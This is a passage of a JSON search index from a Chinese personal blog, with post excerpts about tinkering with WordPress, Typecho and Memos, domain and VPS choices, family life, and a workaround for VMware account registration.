","link":"/it/1327.html","date":"2024-12-18T15:56:23"},{"title":"折腾 升级PHP","content":"#⚒️折腾 抄沉沦大佬的代码，把PHP版本从7升级到8了，各位过路的帮忙测试一下，谢谢\n","link":"/say/1321.html","date":"2024-12-16T12:47:05"},{"title":"吐槽 插件","content":"#📢吐槽 看来我还是离不开这个“最好的 WordPress Markdown 插件 – WP Githuber MD”，byebye,古腾堡\n","link":"/say/1320.html","date":"2024-12-16T11:35:06"},{"title":"折腾 更换LOGO","content":"#⚒️折腾 学学老何，也把自个的博客标题换个Logo，自个是没那个设计细胞的，但也没找到个可以做好免费下载的，没办法只能做好后再截图，再丢给AI修复一下，这不就有了现在这个Logo了，将就着先看吧，各位过路的大佬要是有啥好门子，还请不吝赐教。\n","link":"/say/1317.html","date":"2024-12-15T00:21:55"},{"title":"没事敲打一下自己的博客","content":"\n从Typecho转回Wordpress也有段时间了，也算是各种折腾吧，以往的习惯都是用Debian+LNMP（或者有时懒了，直接就整BT了），Typecho用着轻巧、访问也快，但耐不住俺们这爱折腾的心理，所以这不就又整上Wordpress了呗，既然来了，那就再重新开始折腾一下吧。\n\n\n\n\n\n\n\n这次回到WP，大部分是因为林海草原大佬的一句评论：\n\n\n\n\n我看你说wp运行卡卡的，我推荐你用openlitespeed替代nginx或Apache，运行wp绝对流畅。如果你用宝塔，可以安装openlitespeed。如果想换成其他面板，推荐你用cyberpanel面板，安装好以后它自带openlitespeed。在有openlitespeed存在的情况下，再安装wp以后速度飞快，不比typecho逊色，甚至比typecho还快。\n\n\n\n\n就是因为这一句评论，俺们又耐不住……，所以这不就整起来了，主题选的是设计笔记的Wing，上一次用的也是这家的Adams主题（也是非常喜欢），至于后端当然是林海大佬推荐的Cyberpanel+Litespeed了，自我感觉还是不错的（也有可能是主题作者本身设计","link":"/it/1303.html","date":"2024-12-14T22:34:06"},{"title":"吐槽  评论","content":"#📢吐槽 感觉博客这点评论提醒，还是Bark通知最为迅速，按理说按沉沦博主的设置应该是分分钟的，可是……（可能是我没有配置好，也有可能是我的第三方邮箱响应慢），总是要过一会才能收到，所以目前是Bark+邮件提醒，之前使用Bark通知在提交评论时会报get错误，这次主题作者更新后解决了，所以我终于可以完美1+1提醒了😄\n","link":"/say/1302.html","date":"2024-12-14T10:07:58"},{"title":"吐槽 iphone15信号问题","content":"#📢吐槽 手上的15不知道为啥，周末去店里买东西扫码老是转圈圈，打开微信也是一直“连接中”，有点恼火，打电话给电信，要么让拔卡重装、要么开飞行模式，没啥鸟用（无法上网的时候，打电话是好的），今天中午把IPCC文件给更新了一下，不知道能不能改善，现用一段时间试试看。\n","link":"/say/1294.html","date":"2024-12-09T20:15:25"},{"title":"吐槽 工作","content":"#📢吐槽 感觉干不完的事情，折腾不完的博客，明天又周末了，马上一年又快过去了，一年下来可真钱没赚几个，倒是花了不少，一脚岸上，一脚游离在……，晃一晃，又大了一岁，离老夫又近了一步，以后可以自称为“老朽”了😂\n","link":"/say/1287.html","date":"2024-12-06T14:30:14"},{"title":"折腾  博客","content":"#⚒️折腾 之前在笔记里上传了一张图片，没做过修改，进行测评提示进行修改，想想懒的折腾了，就直接删了吧，结果再刷新或点进首页时就报错“cannot read properties of undefined (reading 'get')”，整整没弄好，都想恢复3号的备份，最后请教了一下老何，说是PHP版本的问题，从8降级到7后，瞬间就正常了，那就还是用7吧（想想我还在Typecho的时候也一直用7，也不知道这回咋的了，非得上个8，结果嘛，还是回来了。\n","link":"/say/1283.html","date":"2024-12-05T16:49:34"},{"title":"吐槽 京东售后","content":"#📢吐槽 京东现在的售后服务虽然没有以前那么好了，但还是不错的，这不昨天家里一年多前买的雷士LED灯泡黑了，看了下还在保就联系商家走了售后，结果今天小哥上门抱了一箱（5个还是6个装的）来说是给换的，看到我只有一个时，傻眼了，最后拆了箱子一换一，又抱着那箱子下去了。\n","link":"/say/1281.html","date":"2024-12-03T15:26:15"},{"title":"日常 生活","content":"#📅日常 今天打早上开始到下班，除了中午休息，其它时间也不知道咋的了，贼忙！下班了才恍然明白，原来今天是周一😂\n","link":"/say/1280.html","date":"2024-12-02T21:15:47"},{"title":"折腾 博客","content":"#⚒️折腾 自从回归到WP后，不再用LNMP、LCMP、BT啥的，转头用起CP+LiteSpeed了，就连系统也从Debian、Ubuntu转到AlmaLinux（头一回用）了，这里还是得好好感谢一下林海草原大佬，好多次把系统折腾崩了，又在大佬的指点下救回来了，博客整了这么多年，还是头一回碰到这么热心肠的，再次感谢！\n","link":"/say/1279.html","date":"2024-12-02T21:10:26"},{"title":"折腾 博客","content":"#⚒️折腾 这两天又在折腾WP了，在林海草原大佬的“怂恿”下，已经从BT+LiteSpeed的模式转到CP+LiteSpeed了，感觉WP的加载速度比我之前的快不少，但不知道是哪里设置有问题了还是咋的，不管是在前台还是后台提交评论时会报错，但也是提交成功的，不知道咋搞，先这样的吧，等哪位大佬来指点指点😂\n","link":"/say/1257.html","date":"2024-12-01T00:32:38"},{"title":"折腾 博客","content":"#⚒️折腾 Wordpress，俺们又回来了\n","link":"/say/1227.html","date":"2024-11-28T00:58:16"},{"title":"Memos添加评论及样式美化","content":"\n这个标题的文章，估计在网上一搜一大把，之所以要写，只是为了日后自己再折腾时方便一些，不用再去找了，没办法，谁叫俺懒呀（从另一方面来讲，我这也是为我的博客水了一篇，计数器上又可以加1了），开始为博客除草了……\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n为Memos加上Bing随机壁纸、顺便换个字体，这个只要在“设置”--“系统”--“自定义样式”和“自定义脚本”加入相应的代码就可以了，先在“自定义样式”加入：\n\n\n\n\n.status-text{font-size:10px !important;border:none;color:rgb(156,163,175) !important;}\n.tag-span,.dark .tag-span{border: 1px solid;border-radius:6px;padding:0px 6px;color:rgb(22,163,74) !important;font-size:12px !important;-webkit-transform: scale(calc(10 / 12));transform-origin: left center;}","link":"/it/1206.html","date":"2024-10-19T21:20:00"},{"title":"又一次折腾Memos","content":"Memos这好东西一直很喜欢，也倒腾过几次，诸如样式、加评论之类的，之前还是用Wordpress时，按照Jack大佬的教程添加过，用着也还不错。后来因为“软云事件”之后，就没折腾了，这不现在换成Typecho后，又想给博客加一个说说页面，按其他大佬的教程很快就搭建好，不过总感觉不太好看，木木大佬的哔哔广场挺好的，样式也挺喜欢，不过感觉加载有点慢，遂想要不要把诸如js、css这些本地化会不会快一点，本以为可以一气而成，结果……芭比Q\n\n翻车的原因很“简单”，就是这个CSS样式不起效，查看源文件中的css链接可以正常访问看到内容，但就是感觉没有加载，用回木木大佬的，又感觉字体和图标等小了些，看到老张和夕格树洞的样式，都比较喜欢，那就先挑个试试看，“盗用”了grid.css和memos.css文件到本地，结果也是样式全无的感觉，但直接调用确是好的，这点东西算是把我折腾晕了，能力有限直接调用了夕格的css文件，然后稍加修改就成了目前的说说页面，比我之前的说说页面好看，当然跟夕格的比起来，就有点磕碜了。\n写到这我还是很好奇，为啥把这两个css放到本地调用，就是不生效，感觉以前抄作业也没这么难呀，","link":"/it/1203.html","date":"2024-10-18T19:48:00"},{"title":"国庆假期结束，准备开干","content":"这玩的时间过的是真快呀，感觉都还没玩嗨，这假期就over了，这不明天该开学的开学，该上班的就得上班了……\n\n\n回头想想，这7天假期也没跑太远，基本上都是在市区里，主要集中在两家新开的商场，反正娃玩的是非常开心，咱这做爹的也就满足了，当然这玩嗨了，钱嘛，估计也花了不少，大家高兴就好，生活嘛不就为了乐一乐嘛。\n","link":"/my/1202.html","date":"2024-10-07T21:53:14"},{"title":"瞧，这小子又换域名了","content":"俺们这小破站又换域名了，上一篇说过，之前趁着便宜时刀了几个自认为的域名，最终把这个俺们觉得最短，有那么一点意思的域名给启用了（其实中文也没想好，待定吧，先用英文顶着），小姨子域名刚启用的时候，就有好多人说来这个迟早得换（额，不换当然也没啥影响的），但既然都刀了其它域名了，那就换了它吧，反正也没多少人会去关注到我这点改动，小站有时就是可以这么的“随性”。\n\n国庆三天假期马上就要过去了，1号、2号逛新商场（从上个月30号晚上就开始逛了），吃了不少钱，也花了不少钱，没办法，总要贡献点吧，今天一天是“特种兵”式的跑了几个地方，也就一百公里的地方，其中有一半都是山路，来来回回的转，开的我都快晕了，后排的那几位更加，好在中午的铁锅炖鱼还行，连我家那挑剔的小朋友都吃了好几块，也算是不虚此行吧（别问我为什么去，我就是个司机，哈哈）。\n明天估计可以待家好好歇歇了，媳妇后天就要上班了，所以得收敛一些，要不然后天上班又要没精神了。\n","link":"/my/1200.html","date":"2024-10-03T22:37:10"},{"title":"有点想换域名了","content":"记得之前我在写《本博要换域名咯》，就有很多人跟我说这个纯数字的xyz域名用不久，当时的我有点犹豫但还是接着用了半年时间，不过在这之前我也用过其它后缀的域名，而且就在用了这个纯数字的xyz域名之后，我也“偷偷”注册过其它域名，不过都没有让我感到满意，看来减法名单上马上就能增加一批新成员了，哈哈。\n\n\n跟着这些老字辈的步伐（如：老张、老麦、老何等等），我也注册了：laoli.xyz、laoliji.com，当然都是新号或优惠券的加持下注册的，比后面的续费价格还是低很多的，可能正是因为注册价格低，才让我脑子一热给注册了吧。然后前几天.net有活动，我也手痒注册了个：zfei.net（美名：知非，当然这可不是《孤舟》的周知非哈，我只是觉得知非这个词还不错，比较有免的不是有：知乎，哈哈）。\n不过虽然说想换域名，但是目前.com、.net续费都不便宜，非数字的.xyz也一样，差不多都要10刀左右了，跟我这纯数字的xyz不能比呀，那些续费一年的钱我都可以续费10年了（不香嘛，也不太影响访问，收录啥的俺早就看淡了），所以啊，俺们还真还没想好，各位路过的看客老爷们也可以给俺个建议哈（听听的得由我哈，哈哈","link":"/my/1199.html","date":"2024-09-16T22:08:37"},{"title":"最近的事@8","content":"好久没更新了，草长的有点高了吧，那就来除除吧。既然标题仍是最近的事，那就来啰嗦一下，顺便日后自己也能“回味”一番。\n\n先来说说博客，俺们又换了个主题，并且还魔改了一些功能，当然这些要么是搬抄了姜先森博客的一些功能，要么就是自己带着ChatGpt一顿乱“打”，就敲出了现在你们看到的这个样子（你说这个跟作者的主题样子差不多？本来就是，我只是小小魔改，加了一些自己觉的有那么点用的功能，让我得瑟一下哈）。没办法，咱没有像那些大佬那般（1900、老麦，老姜等）厉害，动不动就能整出一些俺们玩不会的，所以就“小刀”乱舞吧。说完博客，自然要来说说主机，前阵子用阿里云300元的学生券（别问我怎么来的，问了我也不说，反正俺们是正在光明得来的），“猫”了好几个晚上，才让俺“捞”回来一台HK的轻量，这回就用BT了，懒的敲那一堆代码（懒了，没办法），顺便就把这个博客迁过去了，不过之前买的小厂的Hk还没到期，就顺手做了一个套娃，反代加缓存一下，就是目前这个样子，各位兄台可以刷刷看，有用没用的的俺们不好说，反正我觉得挺好玩的，先玩一会呗。不过这小厂的HK倒是真便宜，9元一个月，2H2G30G外加50G，之前用的感觉","link":"/my/1197.html","date":"2024-09-15T23:33:00"},{"title":"套娃","content":"\n","link":"/it/1195.html","date":"2024-09-02T19:51:29"},{"title":"最近的事@7","content":"好久没有以“最近的事”为标题了，用这个标题可以笼统的写一下最近的所见所闻还是可以的吧，那么开始哔哔啦。\n\n\n最近追的剧就是它了——《少年白马醉春风》，这部是去年《少年歌行》的姊妹篇，但我感觉更像是前传，讲述的是《少年歌行》中上一辈的光辉少年史，故事讲述了镇西侯府公子百里东君不喜文武，独爱酿酒，与已故好友叶云定下了酒仙之约，然而天不遂人愿，百里东君机缘巧合之下，拜入李长生门下习武。在此期间，百里东君结识了玥瑶，还与改名为叶鼎之的叶云重逢，在一众友人的影响之下，素来玩世不恭的百里东君开始承担更多的责任。时间一晃多年过去，叶鼎之被人利用发动战争，百里东君率众抵抗，决心挽救天下苍生，也要救赎曾经挚友的故事。有些演员的安排比较有趣，比如在《少年歌行》中饰演百里东君的言杰，在《少年白马醉春风》中饰演的是百里东君的父亲（一人饰演父子两个角色，厉害），当然还有一些老面孔也会出演，这里就不剧透了，喜欢的自己去看吧。像我这种就中午看个两三集的，目前的更新进度还够我看上几天的，后续可能……\n\n最近换了个手机，手中的iPhone 15换成了媳妇之前用的小米 10S，算是降级体验吧，起因是媳妇想找部手机折腾一下","link":"/my/1191.html","date":"2024-07-23T23:08:00"},{"title":"没啥文字功底却总想写点东西","content":"这个标题，一开始并不是我想取的，自从那天看了老张博客的《没啥文字功底却总想写点东西》，感触颇丰！这篇博文光评论都有160条了，咱不论是非（感觉也没有什么好评论的，各有各的观点嘛），一路看下来，我觉得我这博客上写的东西也有很多如评论者所说的，如果他（或她）看的是我博客，估计那一刹那我可能会有点接受不了，毕竟言词不是一般的激励（好在如此“好事”并未发生在我头上，我可以暗自庆幸一下了）。\n\n\n没啥文字功底却总想写点东西，对于这段文字，ChatGpt 4O给的解释是：\n这句话的意思是，一个人虽然没有很好的写作技巧或文学素养，但仍然有写作的愿望和冲动。简单来说，就是虽然写作水平不高，但依然很想写东西。\n说的挺直白的，仿佛就看到了我自己，啰啰嗦嗦写一堆，可能也只是狗屁不通的一段废话而已，但是我还是写了，因为这是我自己的博客（自己的地盘），在这我可以自由的记载和分享那些我觉得或值得分享或记录的，这就够了，所以往后的日子，我依旧会如此——没啥文字功底却总想写点东西。\n","link":"/my/1188.html","date":"2024-07-16T23:44:00"},{"title":"哈哈，Typecho我又来了","content":" \n哈哈，Typecho我又来了\n \n\n2024-7-12：本来想更一篇的（带了几行代码），结果提交后让宝塔防火墙给掐了，然后………………白写了，这到底是一视同仁呀，兴致全无，咱今天不写了//\n2024-7-13：继续折腾，之前已经把Gravatar换成Cravatar，但还是会抽风，再次模仿姜先森，也把头像改成首字母或首汉字等显示了，虽然看着有点（丑，反正我没说哈），但先这么的吧。返回顶部的按钮也从原来的png图片换了，用着先-----&gt;&gt;\n2024-7-14：将首页的菜单栏也给隐藏了，在哪？先找找看吧，哈哈\n\n\n\n","link":"/my/1185.html","date":"2024-07-05T10:40:00"},{"title":"最近在捣鼓点啥","content":"在写这个文章标题时有点犯迷糊，不知道取啥标题适合，“挣扎”了许久，最后觉得还是用这个标题吧，看着像是在搞什么明堂似的。\n\n话说回来，最近捣鼓的事很多，但大多都拿不上台面，唯一算是搞成的估摸就是《给WordPress添加一个跳转中间页》，其它的都是半达子货，虽然事没成，但花在上面的时间可一点没少，可谓做了很多无谓事，下面就来唠嗑唠嗑。\n\n\nHeadlease Wordpress，这个之前有提过，虽然搞了个半成品（严格上算是一成品，离半成还有点远233），折腾过PHP、Html，甚至还想通过Astro、Next.js、11ty来弄，结果就是花了时间啥也没搞成，自己都感觉自己有点“疯”了。\nGhost，没错，在Headlease Wordpress折腾的过程中，还顺便又提了提Ghost，之所以要捣鼓Ghost，是看到只是玩玩在用的就是Ghost+11ty的架构，看着真是很吸引，但苦于没这个技术实力，结果是Ghost是搭建好了，至于用11ty做前端（除了11ty，还看过其它的，就跟上面Headlease Wordpress提到的Astro、Next.js等），这就完全不会，所以也没折腾成……\n","link":"/my/1184.html","date":"2024-04-19T21:54:00"},{"title":"给Wordpress添加一个跳转中间页","content":"\n看到好多人的博客都有这么一个“神奇”的功能，作为一个备案过的网站我认为确实有需要，毕竟要小心对待嘛，但如果是部署是在那啥且也没有那啥的，个人感觉有或没有其实也没那么重要，管它跳转到哪里跟我又有何关系，不过既然人家有了，我没有，是不是感觉会缺少点啥（这个心理呀，真是要不得，不过倒是又给了自己一个折腾的理由）。\n\n\n\n\n\n\n\n本人作为一个资深的小老白，让我自己写完代码那是万万不可能的，但现在有ChatGpt呀，这玩意已经帮了我不知道多少次忙了，在此我非常正式的感谢一下OpenAI公司，你们太牛了！好了废话不多说这就开干吧。要实现所有链接（文章、评论）都要强制跳转到中间页（这里以go.php)，也不是很难，在主题的functions.php中加入相应的代码：\n\n\n\n/*链接跳转*/\nfunction redirect_external_links($content) {\n    $home_url = home_url(); // 获取WordPress站点的主URL\n    // 使用正则表达式匹配所有链接\n    return preg_replace_callback('#&lt;a","link":"/it/1177.html","date":"2024-04-13T17:32:41"},{"title":"Hello Astro","content":"之前看老麦的博客的文章，说是从NextJS换成Astro，很适合搭建静态博客，使用灵活，过程也不复杂，看的我又有折腾的方向了。目前我的博客除了主站在用的Wordpress外，还有其它的如：Typecho,Xlog，静态博客曾经也折腾过Hexo,Hugo（不过那都是很久的事了，其中搭建/使用等几乎也忘得差不多了），当然其它诸如：Ghost、Halo这种有后台的俺们以前也是用过的。\n\n\n既然Astro这么好玩，那就耍起来呗，官方的教程都有中文的，不得不夸一下，按着步骤来就好，这里需要注意的是要选好主题，这玩意据说换主题比较麻烦（这点不像其它那么方便，但也丝毫不能影响咱们这折腾的心），选好主题后一番部署基本就差不多了。一些小修改啥的基本都是照着官方教程来就可以了，非常简单，关键信息设置好就可以传到自己的Github上，再用Vercel部署就可以了（当然也可以先本地查看一下）。\nAstro最让我困惑的是怎么给它添加评论，折腾了很久也没能搞定，后来还是在老麦的指导下解决了，再次感谢老麦，放弃自己中午休息还给我写教程，感谢感谢！那么下面就来记录一下Astro添加评论的过程。\n\n在组件目录下src/","link":"/it/887.html","date":"2024-03-25T20:53:08"},{"title":"博客的再一次折腾","content":"博客之前一直都是用的军哥的LNMP（Linux+Nginx+MySQL+PHP）一键安装脚本搭建WordPress网站，中间偶尔也用过宝塔、1pancel等，但用的最久的还是LNMP，但从2023年下半年，随着作者军哥用爱发电很多年后将网站卖给某公司，有大神发现LNMP.COM网站的代码里被恶意植入了后门代码，而该公司同时收购了oneinstack，同时期出现了恶意代码，LNMP和oneinstack一键网站环境安装包被广泛弃用。\n\n\n当然替代方案还是有很多的，但还是想借此机会折腾一下新的，那就尝试一下秋水在佬的LCMP(Linux + Caddy + MariaDB + PHP)脚本（Github地址）。Caddy 2是一款现代、轻量级的开源Web服务器，以其简单的配置语法、内置自动HTTPS支持、动态配置和服务发现、现代的HTTP/2和HTTP/3支持、插件系统以及易于部署和管理而脱颖而出。当然论功能、生态、性能等，目前还是Nginx更强。\n下面就来介绍如何用秋水大佬的LCMP一键脚本搭建WordPress。\n目前支持的系统\n\nEnterprise Linux 7 (CentOS ","link":"/it/870.html","date":"2024-03-19T12:28:23"},{"title":"Headless（无头）WordPress折腾记","content":"什么是Headless WordPress？\n无头WordPress是一个术语，指的是任何使用WordPress作为后端软件来管理数据和内容，但使用单独的技术在前端显示数据的网站。后端是用于网站管理区域的术语。您可以在此处创建帖子和页面等内容、安装插件、管理评论等。\n\n\n很早以前在“我爱水煮鱼”网站看到无头Wordpress里（链接），感觉这玩意挺好玩的，但一直都没去折腾，据说他这个是纯PHP+Memcached来实现的，最近也不知道咋的，也在看Hugo和这个无头Wordpress,前者还没搞定，按空白大佬的那套俺们还没整会，记得以前整Hugo或Hexo时，都是要在本地搭环境，然后写文章再生成再PUSH到站点（Github或VPS等等），但现在直接可以把源文件MD直接扔给Github Action后由其生成并PUSH到站点（也有可能是我理解错了，反正我没整好）。扯远了，既然Hugo没整好那就整无头Wordpress吧，等有思路了再去整Hugo，这次整无头Wordperss都是在ChatGpt4的帮助下搞的，几乎全程代码都是由它写，我嘛就直接抄抄改改，谁叫我是老白呀（我对老白的定义就是：","link":"/it/835.html","date":"2024-03-16T18:10:37"},{"title":"本博要换域名咯","content":"出于个人原因（也没啥原因，就是某天逛坛子发现有人在分享便宜域名的事，结果看着看着我又想换了，现在对什么收录啥的也不敏感了，都是写给自己看看的，那么整个便宜的域名是不是又可以省下那么一小笔？）。博客域名近期将更换为：057000.xyz，为啥要注册纯数字的还是xyz后缀的域名，一个原因——便宜，0.67刀/年，续费同价！\n\n\n不折腾、不生活\n口号是这么喊的，文章更新不积极，其它的嘛倒是挺积极的，什么整整主机、域名，捣鼓主题啥的——净不干正事。除了前面说的换域名的事，这两天又开始折腾Cloudflare的各种功能，比如利用Turnstile给Wordpress的登录/注册、评论等页面加了个活人验证，虽然小破站没人看的上，但是垃圾评论倒是多的很，所以得给不是活人的整点事做做，果然加了验证后垃圾评论也没了（试用了几天，后续再观察观察）。\n随后又开始折腾Cloudflare的优选IP加速访问（这个感觉也没那么必须，因为Cloudcone的主机不管是电信还是移动访问都还好，但还是想折腾一下，实现口号不容易呀）。\n\n当然我也是按照教程来的，具体的可以看《通过CloudFlare+SaaS回源优选IP","link":"/it/378.html","date":"2024-03-07T20:20:00"},{"title":"学雷锋纪念日：传承雷锋精神，做一个有温度的人","content":"2022年3月5日，是中国人民心中一个特殊的日子——学雷锋纪念日。这一天，我们纪念的是一位伟大的人，一位用自己的行动诠释了什么是真正的无私奉献的人。\n\n\n雷锋，是一位年轻的军人，他生活在上个世纪五十年代的中国。他的名字在中国人的心中早已达到了一个神圣的地位，他的事迹被广大人民传颂，雷锋精神也成为了中华民族传统美德的代表。雷锋的精神，就是“为人民服务，忘我工作”的精神。\n雷锋的一生短暂而平凡，但他的事迹却感动了整个中国，甚至世界。他在生活中时刻关注他人的需求，乐于助人，无私奉献。无论是帮助老人过马路、扶贫助困、清洁环境，还是无偿献血、支教助学，他总是默默地付出，从不求回报。他的行动激励了一代又一代人，成为了中国人民心中的楷模。\n学雷锋纪念日，是为了纪念雷锋这位伟大的人物，更是为了传承雷锋的精神，让雷锋的精神在每一个人的心中发扬光大。在这个特殊的日子里，我们可以从各个方面来体现雷锋精神，用自己的实际行动来弘扬这种精神。\n首先，我们可以从生活中的点滴小事做起。比如，帮助老人过马路、给需要帮助的人让座、关心身边的人的生活需求等等。这些看似微不足道的小事，却能让他人感受到温暖和关爱，也能让我们的","link":"/my/810.html","date":"2024-03-05T10:51:01"},{"title":"无插件给博客加个说说","content":"\n现在很多博客上都添加了说说或类似的页面，各种样式的都有，看着我心痒痒，真想逮个空给俺那小破站也“武装”一下。看了老张和阿杰等都是调用Memos，样式不错，是俺喜欢的，我也照样画葫芦似的去搭了个Memos（这东西是不错，把它当作随手记也好，当作个人小微博也罢，挺好），但目前尚没有合适的主机跑Docker，要不咱就无插件来一个………………\n\n\n\n\n\n\n\n\n\n\n\n在借助Chatgpt的帮忙下，生成一些代码还是蛮轻松的，本站的归档、标签、友链都是在“家伙”的帮忙下搞定的，要不然就我这榆木脑袋估计还得折腾好久。大致的步骤如下：\n\n\n\n\n在文章分类目录下新建一个说说，slug写为：shuoshuo\n\n\n\n在主题的functions.php中添加如下代码：\n\n\n\n\n/*屏蔽说说在首页中显示*/\nfunction exclude_category_from_home($query) {\n    if ($query-&gt;is_home() &amp;&amp; $query-&gt;is_main_query()) {\n        $excluded_category = get_categ","link":"/it/757.html","date":"2024-01-10T21:34:10"},{"title":"早上的雾真大","content":"\n今天早上的雾真大，大的连我的小毛驴都快招架不住了\n","link":"/my/755.html","date":"2024-01-10T21:07:04"},{"title":"2024，吃香的喝辣的","content":"最近天气起起伏伏，身边很多人都“中招”了（感冒的，支原体等都有），不过我目前还好，估计跟我平常屯的脂肪有关吧（谁叫俺胖呢……），当然该注意的还是得小心点，毕竟家中有小，还是猥琐发育要紧，浪不得……。\n\n媳妇说上次她们闺蜜聚会时，吃的那家重庆鸡公煲不错，让我陪她一起去吃吃，当然不带小的（带去了没菜吃，小的不吃辣），心想不错，好久也没享受二人晚餐了，这不晚上下了班赶紧向着目标赶去。\n\n重庆鸡公煲吃过几回，不过媳妇说的这家店我倒是没吃过，我一直天真的认为这是重庆那里的一种吃法，直到刚才找图时才发现，原来这是一个名叫重庆的莆田人在上海创立的菜品（活生生打脸呀，还有姓重的？？）。到了店门口，发现已经有很多人在排除等了，好在媳妇昨天已经预约好了，等了十来分钟便轮到我们了，上座之后又等了一会，美味的鸡公煲才端上来，一看就是很好吃的样子，我们点的是中份，但肉的分量还是可以的，看着有很多约辣椒，但对于我们来讲还不是很辣，再配点冰可乐，完全KO。\n发觉写到这里，似乎这流水文章已经到头了，其实标题命名时有些夸的成分，用百度百科对“吃香的喝辣的”的解释是：“吃香喝辣是一个汉语成语，意思是形容生活富足，吃喝随意","link":"/my/744.html","date":"2024-01-05T22:19:13"},{"title":"2024年换了主机，换了博客","content":"不知不觉博客已经运行好多年了，期间也是不断折腾（换主题，换主机，又或是折腾主题折腾主机等等），正儿八经的文章倒是越写越少，越写越Low了，别问为啥，问就是懒，除了懒还有啥好说的，一切皆是借口，哪能一点时间都挤不出来呢........\n\n不扯远了，感觉再扯下去有点在写罪已诏（场面立大了吧），说回正题：目前手上的VPS还有不少，都是脑袋一热就刷刷了，理一理有腾讯云（周年庆买的）、阿里云（99元的主机），Racknerd(科学)，Cloudcone(博客)，接下来腾讯云到期就不续了（太贵了），阿里云99元还能续个几年要用的（一些其它网站还跑在上面，都放在国外有点慢），Racknerd再看看吧，最后的Cloudcone没意外的就用着吧，感觉速度还行（电信、移动不同时段访问还可以的）。主机定了就聊聊博客的事吧，在用的也是有那么几家的，像Halo、Typecho、Wordpress，最后一个是最近换到Cloudcone主机上开始用的，看了印记、老张的博客，原来Wordpress也可以跑的很快嘛（难道以前我没用过吗？怎么可能...）。\n博客程序定了，那么就是主题了，用过几个都还是满意的，譬如小胡同学","link":"/it/742.html","date":"2024-01-01T10:19:30"},{"title":"2024新年愿望：暴富！暴富！暴富！","content":"2024年即将到来，在此之际，我许下了一个新年愿望：暴富！暴富！暴富！\n我知道这个愿望有点俗气，但谁不想暴富呢？\n\n\n\n暴富了，就可以买大房子、开豪车、环游世界，想吃什么吃什么，想买什么买什么，再也不用为钱发愁了。\n\n\n暴富了，就可以帮助父母过上更好的生活，让他们安享晚年。\n\n\n暴富了，就可以资助贫困学生，让他们有学上、有书读。\n\n\n暴富了，就可以捐钱给慈善机构，帮助更多需要帮助的人。\n\n\n暴富了，就可以做很多很多有意义的事情。\n\n\n所以，暴富吧！暴富吧！暴富吧！\n当然，我知道暴富不是一件容易的事情。但只要我努力工作，坚持不懈，就一定能实现我的梦想。\n2024年，我将更加努力地工作，争取早日暴富。\n如果暴富不了，那就暴瘦吧！\n祝大家新年快乐，心想事成！\nP.S.欢迎大家在评论区许下你们的新年愿望，让我们一起加油，一起实现梦想！\n以上文章非本人所写，都是用谷歌的Genmini Pro Chat生成的，看着有点贴合俺的小心思，就用了吧，谁不想富呢2333\n&lt;?php\necho &quot;2024新年快乐！&quot;;\n?&gt;\n\n","link":"/my/740.html","date":"2024-01-01T09:53:45"},{"title":"CloudCone，一个还不错的选择","content":"CloudCone 介绍\nCloudCone 成立于 2017 年，美国注册公司 (怀俄明州 2017-000753144)。主营美国洛杉矶 MultaCom 机房的云服务器 / VPS、独立服务器、电子邮件托管等业务。VPS 基于 KVM 虚拟，采用自行研发的控制面板。其所在的 MultaCom 机房采用动态路由网络，会根据不同网络状态调整线路，很多地区的电信网络会走 CN2 线路，因此延迟和稳定性在非高峰时段都较为优秀。同时该主机商提供了按秒计费、随删随用、定期备份服务。支持支付宝、Paypal、信用卡等方式付款。\n\nCloudCone 官网\n主要有两个，其中一个被墙，提供了国内用户专用域名。\n\n官网地址：https://cloudcone.com （被墙，需代理）\n官方镜像：https://cloudcone.com.cn （正常访问）\n\nCloudCone 最新优惠活动\n据我了解，CloudCone 经常会有优惠活动，集中在黑色星期五、情人节、复活节、农历新年、周年纪念等时间，可以在官网的 Hello 界面查看最新的优惠信息。我也会在这个页面不定期更新。\nCloudCone 2","link":"/it/684.html","date":"2023-12-22T21:32:00"},{"title":"家里小朋友发烧了","content":"最近生病的小朋友特别多，一直期盼着家里小朋友能够逃过这一劫，结果上周五（12月1日）发烧了，反复38，39度多，因为有顾虑不想带去医院，所以一直待在家里，好在用美林、阿奇霉素等次日终于降下来，本以来都好了，还特意本周一请了假，好在家调养一下，结果周一又烧了（38度多），晚上吃了阿奇后降下来了，当然周二又请了假休息了一天，周三已经可以去学校了。虽然这次有点反复，但还是比较幸运，当然接下来必要的措施也得跟上，生病了不仅是小孩子遭罪，当父母的折腾不起呀。\n","link":"/my/688.html","date":"2023-12-07T21:56:00"},{"title":"头一回给自己理发","content":"干啥事都有第一回，这不人生头一回给自己理了个发，前面看着还凑合，后面嘛…………我也看不见，随它去吧，一个月后又是一头黑发233\n","link":"/my/689.html","date":"2023-11-30T07:30:00"},{"title":"兰溪一日游","content":"带着一家人去了兰溪一日游，去了游埠还有诸葛八卦村。\n","link":"/my/687.html","date":"2023-11-20T05:38:15"},{"title":"关于博客的那些年","content":"大家好，我是一个喜欢写博客的人。我从2012年开始创建了自己的博客，从那时起，我就一直在记录自己的生活、学习和感想。在这些年里，我尝试过不同的博客平台，包括Wordpress，Typecho，Hexo，Hugo，Ghost，Halo和基于Notion的NotionNext。每个平台都有它的优缺点，我也从中学到了很多东西。\n\n\n目前，我在用的博客平台有四个：Ghost、Typecho，Halo和基于Notion的NotionNext。Ghost是一个简洁而强大的博客系统，它让我可以专注于写作；Typecho是一个轻量而灵活的博客程序，它让我可以自由地定制我的博客；Halo是一个优雅而现代的博客框架，它让我可以享受美观的界面和功能；基于Notion的NotionNext是一个创新而实用的博客解决方案，它让我可以利用Notion这个强大的笔记工具来管理我的博客。\n虽然我很喜欢这些博客平台，但是随着年龄、工作和其他因素的影响，我发现自己越来越难以维护和更新这么多的博客。所以，我决定做一个简化，保留Halo和基于Notion的NotionNext这两个平台。Halo是我的主要博客，它会记录我的一","link":"/my/625.html","date":"2023-04-29T17:27:08"},{"title":"VMware（ESXI）官网账号注册报错的解决办法","content":"最近想给我的小主机换个平台，之前用过PVE、Unraid，就是没用过ESXI，这不好奇心驱使，想去官网下载个耍耍，结果生生卡在注册大关上，不管是中文还是英文，都是报错，如：\n\n\n\n中文验证码死活输不进，一直大写。\nPostal code一直报错。\n\n找了一圈教程，终于在CSDN上找到了解决办法，关于中文验证码：\n\n可以限制记事本输入在复制到验证码框。\n把语言切换成English。\n\n关于Postal code一直报错：\n\n在地址前面加个数字。\n输入霉国的城市。\n\nAddress 1    1ONE\nAddress 2\nCity    SACRAMENTO\nPostal code    94203-0001\nCountry/Territory    United States\nState or province    California\n这地址前面加个 1 